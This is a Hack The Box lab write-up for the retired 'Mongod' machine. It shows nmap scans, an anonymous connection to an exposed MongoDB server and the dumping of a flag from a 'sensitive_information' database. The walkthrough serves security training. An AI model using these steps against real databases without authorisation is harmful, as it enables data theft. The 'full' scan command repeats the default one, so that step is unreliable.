---
title: "Hack The Box - Mongod"
date: 2022-10-16T13:05:37+05:30
draft: false
description: " mongod from HackTheBox is an retired machine which is vulnerable to security Misconfiguration, which can be exploited with help of default credential "
hideToc: false
tocPosition: outer
enableToc: true
enableTocContent: false
author: Atom
authorEmoji: ✍️
tags:
- MongoDB
series:
- Starting Point Tire 0
categories:
- Very Easy
- HackTheBox
- Linux
libraries:

image: /images/hackthebox/mongod/1.png 
---

Hi Hackers Welcome Back, Today we are going to look at Hack The Box Mongod Machine.

## Info Table
<table style="width:100%">
 <thead>
  <tr>
    <th>Room Name</th>
    <th>Mongod</th>
  </tr>
</thead>
<tr>
    <td>Category</td>
    <td>Hack The Box</td>
    </tr>
  <tr>
    <td>OS</td>
    <td>Linux</td>
    </tr>
  </tr>
   <tr>
    <td>Difficulty</td>
    <td>Very Easy</td>
    </tr>
    <tr>
    <td>Maker</td>
    <td>Hack The Box</td>
    </tr>
    <tr>
    </tr>
</table>

## Kill Chain Summery
While enumerating ports and services we can able to find the port 27017 ware open. which is mongodb service, connected as a  anonymous user.

## Recon

Lets start with default script scan 

```bash
atom@atom-VirtualBox:~/htb/mongod$ nmap -sC -sV 10.129.147.150
Starting Nmap 7.80 ( https://nmap.org ) at 2022-10-12 22:18 IST
Nmap scan report for 10.129.147.150
Host is up (0.23s latency).
Not shown: 988 closed ports
PORT      STATE    SERVICE       VERSION
13/tcp    filtered daytime
22/tcp    open     ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
311/tcp   filtered asip-webadmin
513/tcp   filtered login
1094/tcp  filtered rootd
1594/tcp  filtered sixtrak
2909/tcp  filtered funk-dialout
3871/tcp  filtered avocent-adsap
4129/tcp  filtered nuauth
7106/tcp  filtered unknown
8291/tcp  filtered unknown
27356/tcp filtered unknown
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 61.71 seconds
```

Expect 1 port all other ports are filtered by firewall, default scri[t scan will perform scan on top 1000 ports, for better enumeration lets scan entire port 

```bash
atom@atom-VirtualBox:~/htb/mongod$ nmap -sC -sV 10.129.147.150
Starting Nmap 7.80 ( https://nmap.org ) at 2022-10-12 22:18 IST
Nmap scan report for 10.129.147.150
Host is up (0.23s latency).
Not shown: 988 closed ports
PORT      STATE    SERVICE       VERSION
22/tcp    open     ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
27017/tcp open     mongodb       MongoDB 3.6.8 
```

Databases are a collection of organized information that can be easily accessed, managed and updated. In most environments, database systems are very important because they communicate information related to your sales transactions, product inventory, customer profiles and marketing activities. There are different types of databases and one among them is MongoDB, which is a document-oriented NoSQL database. It is crucial to be aware of how the data is stored in different types of databases and how we can connect to these remote database servers and retrieve the desired data. In a document-oriented NoSQL database, the data is organized into a hierarchy of the following levels:

1. databases
2. collections
3. documents

Databases make up the top level of data organization in a MongoDB instance. Databases are organized into collections which contain documents. Documents contain literal data such as strings, numbers, dates, etc. in a JSON-like format. It often happens that the database server is misconfigured to permit anonymous login which can be exploited by an attacker to get access to sensitive information stored on the database. Mongod is a Linux box that features a MongoDB server running on it which allows anonymous login without a username or

password. We can remotely connect to this MongoDB server using the mongo command line utility and enumerate the database in it to retrieve the flag.

**MongoDB**

MongoDB is a document-oriented NoSQL database. Instead of using tables and rows like in traditional relational databases, MongoDB makes use of collections and documents. Each database contains collections which in turn further contain documents. Each document consists of key-value pairs which are the basic unit of data in a MongoDB database. A single collection can contain multiple documents and they are schema-less meaning that the size and content of each document can be different from each another.

**Connecting to MongoDB**

In order to connect to the remote MongoDB server running on the target box, we will need to install the mongodb utility, which can be done on Debian-based Linux distributions (like Parrot, Kali and Ubuntu) by downloading the following tar archive file.

```

curl -O https://fastdl.mongodb.org/linux/mongodb-linux-x86_64-3.4.7.tgz
``` 
```
tar xvf mongodb-linux-x86_64-3.4.7.tgz
```

``` 
cd mongodb-linux-x86_64-3.4.7/bin

```
```
./mongo mongodb://{target_IP}:27017
```

```bash
atom@atom-VirtualBox:~/tools/mongodb-linux-x86_64-3.4.7/bin$ ./mongo mongodb://10.129.151.153:27017
MongoDB shell version v3.4.7
connecting to: mongodb://10.129.151.153:27017
MongoDB server version: 3.6.8
WARNING: shell and server versions do not match
Welcome to the MongoDB shell.
For interactive help, type "help".
For more comprehensive documentation, see
	http://docs.mongodb.org/
Questions? Try the support group
	http://groups.google.com/group/mongodb-user
Server has startup warnings: 
2022-10-16T07:56:17.749+0000 I STORAGE  [initandlisten] 
2022-10-16T07:56:17.750+0000 I STORAGE  [initandlisten] ** WARNING: Using the XFS filesystem is strongly recommended with the WiredTiger storage engine
2022-10-16T07:56:17.750+0000 I STORAGE  [initandlisten] **          See http://dochub.mongodb.org/core/prodnotes-filesystem
2022-10-16T07:56:21.200+0000 I CONTROL  [initandlisten] 
2022-10-16T07:56:21.200+0000 I CONTROL  [initandlisten] ** WARNING: Access control is not enabled for the database.
2022-10-16T07:56:21.200+0000 I CONTROL  [initandlisten] **          Read and write access to data and configuration is unrestricted.
2022-10-16T07:56:21.200+0000 I CONTROL  [initandlisten] 
>
```

We have successfully connected to the remote MongoDB instance as an anonymous user. We can list the databases present on the MongoDB server using the following command.

```bash
> show dbs;
admin                  0.000GB
config                 0.000GB
local                  0.000GB
sensitive_information  0.000GB
users                  0.000GB
>
```

We can see that there exists a single collection named flag . We can dump the contents of the documents present in the flag collection by using the db.collection.find() command. Let's replace the collection name flag in the command and also use pretty() in order to receive the output in a beautified format.

```jsx
test> use sensitive_information
switched to db sensitive_information
sensitive_information> db.flag.find().pretty() 
[
  {
    _id: ObjectId("630e3dbcb82540ebbd1748c5"),
    flag: '1b6e6fb359e7c40241b6d431427ba6ea'
  }
]
sensitive_information>
```